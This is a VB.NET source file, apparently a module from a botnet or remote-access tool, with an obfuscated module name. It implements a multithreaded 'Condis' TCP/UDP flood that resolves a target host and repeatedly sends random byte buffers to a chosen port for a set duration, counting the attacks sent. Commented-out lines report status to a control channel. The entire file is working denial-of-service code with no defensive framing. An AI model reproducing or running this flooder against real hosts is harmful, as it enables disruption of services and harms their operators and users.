Imports System.Threading
Module 티기음피
    Private ThreadsEnded = 0
    Private HostToAttack As String
    Private TimetoAttack As Integer
    Private ThreadstoUse As Integer
    Private Port As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private attacks As Integer = 0
    Private msgLength As Integer
    Private methods As String
    Public Sub StartCondis(ByVal Host As String, ByVal Threadsto As Integer, ByVal Time As Integer, ByVal Ports As Integer, ByVal length As Integer, ByVal method As String)
        If Not AttackRunning = True Then
            AttackRunning = True
            HostToAttack = Host
            Port = Ports
            ThreadstoUse = Threadsto
            TimetoAttack = Time
            msgLength = length
            methods = method
            Threads = New Thread(Threadsto - 1) {}
            Mainmenu.changeStatus("TCP/UDP attack")
            For i As Integer = 0 To Threadsto - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next

        Else
            'Form1.TalkChannel("A Condis Attack is Already Running on " & HostToAttack & ":" & Port.ToString)
        End If

    End Sub
    Private Sub lol()

        ThreadsEnded = ThreadsEnded + 1
        If ThreadsEnded = ThreadstoUse Then
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            'Form1.TalkChannel("Condis Attack on " & HostToAttack & ":" & Port.ToString & " finished successfully. Attacks Sent: " & attacks.ToString)
            attacks = 0
        End If

    End Sub

    Public Sub StopCondis()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False
            'Form1.TalkChannel("Condis Attack on " & HostToAttack & ":" & Port.ToString & " aborted successfully. Attacks Sent: " & attacks.ToString)
            attacks = 0

        Else
            'Form1.TalkChannel("No Condis Attack is Running!")
        End If
    End Sub

    Private Sub DoWork()

        Try
            '  Dim tcpc As New Net.Sockets.Socket(Net.Sockets.AddressFamily.InterNetwork, Net.Sockets.SocketType.Stream, Net.Sockets.ProtocolType.Tcp)
            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = Stopwatch.StartNew
            Dim hostip As Net.IPAddress = Net.IPAddress.Parse(Net.Dns.GetHostAddresses(HostToAttack)(0).ToString())
            Dim hostep As New Net.IPEndPoint(hostip, Port)

            Do While (stopwatch.Elapsed < span)
                Try
                    Dim random As New Random
                    Dim buffer As Byte() = New Byte(msgLength - 1) {}
                    Dim i As Integer
                    For i = 0 To msgLength - 1
                        buffer(i) = CByte(random.Next(0, 100))
                    Next i
                    Dim tcpc
                    If methods = "tcp" Then
                        tcpc = New Net.Sockets.Socket(Net.Sockets.AddressFamily.InterNetwork, Net.Sockets.SocketType.Stream, Net.Sockets.ProtocolType.Tcp)
                    Else
                        tcpc = New Net.Sockets.Socket(Net.Sockets.AddressFamily.InterNetwork, Net.Sockets.SocketType.Stream, Net.Sockets.ProtocolType.Udp)
                    End If

                    tcpc.Connect(hostep)
                    tcpc.SendTo(buffer, hostep) 'SEND THAT SHIT
                    attacks = attacks + 1
                    tcpc.Close()
                    Continue Do
                Catch
                    Continue Do
                End Try
            Loop
        Catch : End Try

        lol()
    End Sub
End Module
